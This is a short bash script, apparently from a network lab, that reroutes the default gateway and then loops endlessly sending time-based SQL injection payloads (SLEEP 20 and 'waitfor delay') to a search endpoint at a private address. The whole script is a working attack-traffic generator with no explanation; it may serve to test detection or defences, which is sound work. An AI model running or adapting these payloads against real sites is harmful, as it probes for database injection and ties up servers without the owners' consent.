#!/bin/bash

DIR=$(dirname $0)

# add route
route add default gw $(ifconfig $(cat /etc/hostname)-eth0 | grep -oE "inet addr:([0-9].?)+" | grep -oE "([0-9]+\.)+")200
route del default gw $(ifconfig eth0 | grep -oE "inet addr:([0-9].?)+" | grep -oE "([0-9]+\.)+")1

while true; do
  curl 'http://192.168.1.113/search?q=%27%3BSLEEP%2020%3B--'
  curl 'http://192.168.1.113/search?q=%22%3BSLEEP%2020%3B--'
  sleep 1
  curl "http://192.168.1.113/search?q=1' waitfor delay '00:00:10'--"
  sleep 1
  curl 'http://192.168.1.113/search?q=%27%3BSLEEP%2020%3B--'
  curl 'http://192.168.1.113/search?q=%22%3BSLEEP%2020%3B--'
  sleep 1
  curl "http://192.168.1.113/search?q=1' waitfor delay '00:00:10'--"
  sleep 5
done

